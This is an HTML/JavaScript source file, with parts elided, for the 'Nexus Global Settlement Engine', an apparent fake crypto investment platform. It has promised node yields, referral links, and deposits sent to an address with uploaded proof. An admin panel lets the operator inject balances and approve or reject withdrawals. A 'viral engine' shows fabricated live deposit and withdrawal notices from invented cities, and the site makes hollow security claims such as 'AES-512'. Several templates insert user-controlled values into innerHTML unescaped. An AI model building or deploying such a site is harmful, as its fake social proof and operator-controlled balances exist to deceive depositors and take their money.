...
<body>
    ...
    <div class="marquee-box"><div id="broadcast-msg" class="marquee-text uppercase">NEXUS GLOBAL SETTLEMENT ENGINE ACTIVE... SECURED BY AES-512... MULTI-CHAIN PROTOCOL LIVE... NO LATENCY DETECTED...</div></div>
    ...
    <div id="viral-toast" class="glass p-5 flex items-center gap-5 border-t-2 border-pink-500 shadow-2xl">
        ...
        <div class="flex-1">
            ...
            <p id="toast-action" class="text-[9px] font-bold text-zinc-500 uppercase tracking-tighter">Just Injected $1,500.00</p>
        </div>
        <div class="text-[8px] font-black text-green-500 uppercase">LIVE</div>
    </div>
    ...
    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="max-w-md w-full glass p-10 space-y-10 border-b-4 border-blue-600">
            <div id="login-ui" class="space-y-8">
                <div class="text-center"><h2 class="text-4xl font-black italic tracking-tighter uppercase">Authorized <span class="text-pink-500 block text-sm tracking-[8px] mt-2">Login</span></h2></div>
            ...
            <div id="signup-ui" class="space-y-8 hidden">
                <h2 class="text-3xl font-black italic tracking-tighter uppercase text-center text-blue-500">System <span class="text-white block text-sm tracking-[5px] mt-2">Registration</span></h2>
                ...
                <input type="text" id="s-ref" placeholder="Referral Protocol" class="input-hub" readonly>
    ...
    <div id="dashboard" class="hidden pt-16 pb-36">
        ...
        <main id="page-home" class="p-6 space-y-8">
            ...
            <div class="glass p-8 space-y-5 border-l-4 border-yellow-500">
                ...
                <div class="flex gap-3">
                    <input type="text" id="promo-input" placeholder="Enter Code" class="input-hub !py-3 font-black tracking-widest text-center uppercase">
        ...
        <main id="page-market" class="p-6 space-y-8 hidden"><h3 class="text-2xl font-black italic uppercase text-blue-400">Node Marketplace</h3><div id="market-list" class="grid gap-6"></div></main>
        ...
        <main id="page-vault" class="p-6 space-y-10 hidden">
            <div class="glass p-8 space-y-8">
                ...
                <div id="dep-form" class="hidden space-y-6 pt-6 border-t border-white/10 animate-fade-in">
                    <div class="text-center"><p id="dep-addr" class="text-[10px] font-mono break-all bg-black p-4 rounded-2xl text-zinc-400 border border-white/5 select-all"></p><p class="text-[8px] text-pink-500 mt-2 font-black uppercase italic">Click to copy address</p></div>
                    ...
                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] file:bg-white/5 file:border-0 file:rounded-full file:px-6 file:py-3 file:text-white">
                    <img id="preview-img" class="w-full h-48 object-cover rounded-3xl hidden">
            ...
            <div class="glass p-8 space-y-8">
                ...
                <button onclick="submitWith()" class="btn-master !bg-white !text-black !shadow-none">Initialize Egress</button>
            </div>
        </main>

        <main id="page-logs" class="p-6 space-y-8 hidden">
            <div><h3 class="text-xl font-black uppercase italic mb-8">Protocol Ledger</h3><div id="history-list" class="grid gap-4"></div></div>
            <div class="glass p-8"><h3 class="text-lg font-black uppercase italic text-pink-500 mb-6">Security Compliance</h3><p class="text-[10px] text-zinc-600 font-bold uppercase tracking-widest leading-relaxed">Nexus Infrastructure operates under global V4.0 compliance. All egress transactions are audited for security within 24 business hours.</p></div>
        </main>
    ...
    <div id="admin-panel" class="fixed inset-0 bg-[#030508] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b border-white/10">
            <h2 class="text-2xl font-black italic text-pink-500 uppercase tracking-tighter">Imperial Control</h2>
        ...
        <div class="space-y-10">
            <div class="glass p-8 space-y-6 border-l-4 border-yellow-500">
                <h4 class="text-[10px] font-black uppercase text-zinc-500 tracking-[5px]">Promo Code Config</h4>
            ...
            <div class="glass p-8 space-y-6 border-l-4 border-blue-500">
                <h4 class="text-[10px] font-black uppercase text-zinc-500 tracking-[5px]">Inject Portfolio Equity</h4>
            ...
            <div class="glass p-8 space-y-4">
                <h4 class="text-[10px] font-black uppercase text-zinc-500 tracking-[5px]">Broadcast Network Message</h4>
                <input type="text" id="adm-bc" placeholder="Enter Marquee Text..." class="input-hub">
                <button onclick="updateBC()" class="btn-master !py-3 !bg-zinc-800">Broadcast</button>
            </div>
            <h3 class="text-xs font-black uppercase text-zinc-500 tracking-[10px] ml-4">Audit Queue</h3>
    ...
    <script type="module">
        ...
        function startViralEngine() {
            const locs = ["(Dubai)", "(Tokyo)", "(London)", "(USA)", "(Seoul)", "(Berlin)"], 
                  acts = ["Just Deposited $5,000", "Withdrew $1,200", "Purchased Level-10 Node", "Unlocked Global Yield", "Redeemed Promo Code"];
            setInterval(() => {
        ...
        window.copyRef = () => {
            ...
            navigator.clipboard.writeText(link); alert("Imperial Referral Link Copied!");
        };
        ...
        window.redeemPromo = async () => {
            ...
            if(!sys.exists() || code !== sys.val().code) return alert("System Warning: Invalid Access Code.");
            if(userS.val().usedPromo) return alert("System Warning: Protocol already used by this identity.");
            const bonus = parseFloat(sys.val().value);
            await update(ref(db, `users/${u}`), { balance: (userS.val().balance || 0) + bonus, usedPromo: true });
            alert(`Equity Injected: $${bonus} added!`);
        };
        ...
        window.updatePromoConfig = async () => {
            ...
            await set(ref(db, 'system/promo'), { code: c, value: v }); alert("Promo System Synced Globally.");
        };
        ...
        window.updateBC = async () => { await set(ref(db, 'system/broadcast'), document.getElementById('adm-bc').value); alert("Network Broadcast Synced."); };

        // CORE LOGIC (Firebase Auth/Dashboard)
            ...
            onValue(ref(db, `users/${uid}`), (snap) => {
                ...
                document.getElementById('history-list').innerHTML = history.map(h => `
                    <div class="glass p-6 border-r-4 ${h.status === 'Approved' ? 'border-green-500' : 'border-pink-500'} flex justify-between items-center">
                        <div><p class="text-[11px] font-black uppercase">${h.type}</p><p class="text-[8px] text-zinc-600 font-bold mt-2">${h.date}</p></div>
                        <div class="text-right"><p class="text-sm font-black italic">$${parseFloat(h.amount).toFixed(2)}</p><p class="text-[9px] font-black uppercase tracking-widest ${h.status === 'Approved' ? 'text-green-500' : 'text-pink-500'}">${h.status}</p></div>
                    </div>`).join('') || '<p class="text-center opacity-30 py-20 uppercase font-black text-[10px]">Ledger Synchronized</p>';
                ...
                document.getElementById('active-nodes-list').innerHTML = activeNodes.map(([k, n]) => {
                    ...
                    return `<div class="glass p-7 border-l-4 border-blue-500 flex justify-between items-center"><div><p class="text-[11px] font-black uppercase">${n.title}</p><p class="text-[9px] font-bold text-zinc-600">Sync Yield: $${n.daily.toFixed(2)}</p></div><p class="text-[9px] font-black text-blue-400 animate-pulse uppercase">Active</p></div>`;
                }).join('');
            });
        }
        ...
        window.submitDep = async () => {
            const u = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Incomplete Protocol.");
            const hKey = push(ref(db, `users/${u}/history`)).key;
            const ent = { user: u, amount: amt, tid, proof, method: sMet, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey };
            await set(ref(db, `users/${u}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent); alert("Settlement Proof Transmitted.");
        };
        ...
        window.submitWith = async () => {
            ...
            if(amt < 10 || (s.val().profit || 0) < amt) return alert("Insufficient Yield.");
            const hKey = push(ref(db, `users/${u}/history`)).key;
            ...
            await set(ref(db, `users/${u}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent); alert("Withdrawal Initialized.");
        };

        // REQUEST MANAGEMENT
        window.manage = async (id, user, amt, hKey, action, type) => {
            if(action === 'approve') {
                if(type === 'Deposit') { const s = await get(ref(db, `users/${user}`)); await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) }); }
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else {
                if(type === 'Withdrawal') { const s = await get(ref(db, `users/${user}`)); await update(ref(db, `users/${user}`), { profit: (s.val().profit || 0) + parseFloat(amt) }); }
            ...
            onValue(ref(db, 'admin/requests'), (snap) => {
                ...
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass p-7 space-y-5 border border-white/10">
                        ...
                        <p class="text-[9px] font-bold text-zinc-500">USER: ${l.user}</p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-48 object-cover rounded-3xl" onclick="window.open(this.src)">` : ''}
                    ...
                    </div>`).join('') : '<p class="text-center opacity-30 py-10 uppercase font-black text-[10px]">Audit Clear</p>';
            });
        }
        ...
        window.buyNode = async (id) => { /* Reuse buyNode logic from previous */ };
    </script>
</body>
</html>
